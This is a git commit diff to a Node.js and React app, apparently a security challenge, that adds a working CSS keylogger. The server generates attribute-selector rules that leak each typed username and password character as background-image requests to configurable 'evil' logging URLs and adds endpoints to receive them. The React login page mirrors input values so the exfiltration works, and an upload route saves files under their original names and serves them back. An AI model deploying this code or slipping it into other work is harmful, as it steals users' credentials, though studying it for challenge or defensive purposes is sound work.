2e2731c2e8d57f5f2a0ea69844eb4a459d77b9bd
Ligar Mugi Syahid <mugisyahid@gmail.com>
2020-09-15 22:04:56 +0700

    nyerahh

--- server.js
+++ server.js
@@ -1,57 +1,158 @@
-//server.js
-const express = require('express');
-const favicon = require('express-favicon');
-const path = require('path');
-const multer = require('multer');
+const express = require("express");
+const favicon = require("express-favicon");
+const path = require("path");
+const multer = require("multer");
+const { v4: uuidv4 } = require("uuid");
 const port = process.env.PORT || 8080;
 const app = express();
-const cssFilter = require('./cssFilter');
-const evilFolder = 'public/evil_lfi_folder/';
-
+const cssFilter = require("./cssFilter");
+const evilFolder = "public/evil_lfi_folder/";
+const evilUrl = process.env.EVIL_URL || "http://localhost:8080/log/";
+const evilUrlUsername =
+  process.env.EVIL_URL_USERNAME || "http://localhost:8080/log/username/";
+const evilUrlPassword =
+  process.env.EVIL_URL_PASSWORD || "http://localhost:8080/log/password/";
 
 const storage = multer.diskStorage({
-    destination: function(req, file, cb) {
-        cb(null, evilFolder);
-    },
-    // By default, multer removes file extensions so let's add them back
-    filename: function(req, file, cb) {
-        cb(null, file.originalname );
-    }
+  destination: function (req, file, cb) {
+    cb(null, evilFolder);
+  },
+  // By default, multer removes file extensions so let's add them back
+  filename: function (req, file, cb) {
+    cb(null, file.originalname);
+  },
 });
 
-app.use(favicon(__dirname + '/build/favicon.ico'));
+app.use(favicon(__dirname + "/build/favicon.ico"));
 app.use(express.static(__dirname));
-app.use(express.static(path.join(__dirname, 'build')));
+app.use(express.static(path.join(__dirname, "build")));
 
-app.get('/ping', function (req, res) {
- return res.send('pong');
+app.get("/ping", function (req, res) {
+  return res.send("pong");
 });
 
-app.post('/development', (req, res) => {
-    let upload = multer({ storage: storage, fileFilter: cssFilter.cssFilter  }).single('css');
-
-    upload(req, res, function(err) {
-        // req.file contains information of uploaded file
-        // req.body contains information of text fields, if there were any
-
-        if (req.fileValidationError) {
-            return res.send(req.fileValidationError);
-        }
-        else if (!req.file) {
-            return res.send('Please upload an css file');
-        }
-        else if (err instanceof multer.MulterError) {
-            return res.send(err);
-        }
-        else if (err) {
-            return res.send(err);
-        }
-        res.sendFile(path.join(__dirname, req.file.path));
-    });
+app.get("/log/:key", function (req, res) {
+  res.setHeader(
+    "cache-control",
+    "private, no-cache, no-store, must-revalidate"
+  );
+  res.setHeader("Expires", 0);
+  res.setHeader("pragma", "no-cache");
+  res.setHeader("Etag", uuidv4());
+  res.sendStatus(400);
 });
 
-app.get('/*', function (req, res) {
-  res.sendFile(path.join(__dirname, 'build', 'index.html'));
+app.get("/log/username/:key", function (req, res) {
+  res.setHeader(
+    "Cache-Control",
+    "private, no-cache, no-store, must-revalidate"
+  );
+  res.setHeader("Expires", 0);
+  res.setHeader("pragma", "no-cache");
+  res.send(req.params.key);
+});
+
+app.get("/log/password/:key", function (req, res) {
+  res.setHeader(
+    "Cache-Control",
+    "private, no-cache, no-store, must-revalidate"
+  );
+  res.setHeader("Expires", 0);
+  res.setHeader("pragma", "no-cache");
+  res.send(req.params.key);
+});
+
+app.post("/development", (req, res) => {
+  let upload = multer({
+    storage: storage,
+    fileFilter: cssFilter.cssFilter,
+  }).single("css");
+
+  upload(req, res, function (err) {
+    if (req.fileValidationError) {
+      return res.send(req.fileValidationError);
+    } else if (!req.file) {
+      return res.send("Please upload an css file");
+    } else if (err instanceof multer.MulterError) {
+      return res.send(err);
+    } else if (err) {
+      return res.send(err);
+    }
+    res.sendFile(path.join(__dirname, req.file.path));
+  });
+});
+
+// https://github.com/Cyral/CSS-Keylogger
+app.get("/bad.css", (req, res) => {
+  res.header("Content-Type", "text/css");
+  res.send(createCSS(req.query.length));
+});
+
+function createCSS(l) {
+  let css = "";
+  const values = [];
+  const length = typeof l === "undefined" ? 1 : parseInt(l);
+  // Create an array of all the characters we want to log.
+  for (let i = 32; i < 127; i++) {
+    let value = String.fromCharCode(i);
+    const urlValue = encodeURIComponent(value); // The URL characters must be escaped.
+
+    if (value === `"`) value = `\\"`;
+    if (value === `\\`) value = `\\\\`;
+    values.push({ css: value, url: urlValue });
+  }
+
+  values.forEach((v1) => {
+    css += `input[type="text"][value$="${v1.css}"] { background-image: url("${evilUrlUsername}${v1.url}") !important }\n`;
+    css += `input[type="password"][value$="${v1.css}"] { background-image: url("${evilUrlPassword}${v1.url}") !important }\n`;
+    if (length >= 2) {
+      values.forEach((v2) => {
+        css += `input[type="text"][value$="${
+          v1.css + v2.css
+        }"] { background-image: url("${evilUrlUsername}${
+          v1.url + v2.url
+        }") !important }\n`;
+        css += `input[type="password"][value$="${
+          v1.css + v2.css
+        }"] { background-image: url("${evilUrlPassword}${
+          v1.url + v2.url
+        }") !important }\n`;
+        if (length >= 3) {
+          values.forEach((v3) => {
+            css += `input[type="text"][value$="${
+              v1.css + v2.css + v3.css
+            }"] { background-image: url("${evilUrlUsername}${
+              v1.url + v2.url + v3.url
+            }") !important }\n`;
+            css += `input[type="password"][value$="${
+              v1.css + v2.css + v3.css
+            }"] { background-image: url("${evilUrlPassword}${
+              v1.url + v2.url + v3.url
+            }") !important }\n`;
+            if (length >= 4) {
+              values.forEach((v4) => {
+                css += `input[type="text"][value$="${
+                  v1.css + v2.css + v3.css + v4.css
+                }"] { background-image: url("${evilUrlUsername}${
+                  v1.url + v2.url + v3.url + v4.url
+                }") !important }\n`;
+                css += `input[type="password"][value$="${
+                  v1.css + v2.css + v3.css + v4.css
+                }"] { background-image: url("${evilUrlPassword}${
+                  v1.url + v2.url + v3.url + v4.url
+                }") !important }\n`;
+              });
+            }
+          });
+        }
+      });
+    }
+  });
+  return css;
+}
+
+app.get("/*", function (req, res) {
+  res.sendFile(path.join(__dirname, "build", "index.html"));
 });
 
 app.listen(port, () => console.log(`Server is running at ${port}`));
--- src/index.js
+++ src/index.js
@@ -1,15 +1,82 @@
-import React from 'react';
-import ReactDOM from 'react-dom';
-import './index.css';
-import App from './App';
-import * as serviceWorker from './serviceWorker';
+import React from "react";
+import ReactDOM from "react-dom";
+import * as serviceWorker from "./serviceWorker";
+import logo from "./logo.svg";
+import "./App.css";
+import "./index.css";
 
-ReactDOM.render(
-  <React.StrictMode>
-    <App />
-  </React.StrictMode>,
-  document.getElementById('root')
-);
+class App extends React.Component {
+  constructor() {
+    super();
+    this.usernameField = React.createRef();
+    this.passwordField = React.createRef();
+
+    this.handleChangeUsername = this.handleChangeUsername.bind(this);
+    this.handleChangePassword = this.handleChangePassword.bind(this);
+
+    this.state = { username: "", password: "" };
+  }
+
+  handleChangeUsername(evt) {
+    this.setState({ username: this.usernameField.current.value });
+  }
+
+  handleChangePassword(evt) {
+    this.setState({ password: this.passwordField.current.value });
+  }
+
+  render() {
+    return (
+      <div className="App">
+        <body className="App-header">
+          <div class="titan-background"></div>
+          <div class="marvellous-container">
+            <div class="header">
+              <h1>
+                <span class="title-marvel">release your</span>
+                <span class="title-studios">inner ninja</span>
+              </h1>
+              <h2> **under maintenance** </h2>
+              <img src={logo} className="App-logo" alt="logo" />
+              <div class="input-field">
+                <input
+                  type="text"
+                  name="username"
+                  id="username"
+                  placeholder="username"
+                  autoComplete="off"
+                  required=""
+                  defaultValue={this.state.username}
+                  ref={this.usernameField}
+                  onChange={this.handleChangeUsername}
+                  />
+              </div>
+              <div class="input-field">
+                <input
+                  type="password"
+                  name="password"
+                  id="password"
+                  placeholder="password"
+                  autoComplete="off"
+                  required=""
+                  defaultValue={this.state.password}
+                  ref={this.passwordField}
+                  onChange={this.handleChangePassword}
+                />
+              </div>
+              <h2>{this.state.username}</h2>
+              <div class="wrap">
+                <div class="ninja"></div>
+              </div>
+            </div>
+          </div>
+        </body>
+      </div>
+    );
+  }
+}
+
+ReactDOM.render(<App />, document.getElementById("root"));
 
 // If you want your app to work offline and load faster, you can change
 // unregister() to register() below. Note this comes with some pitfalls.
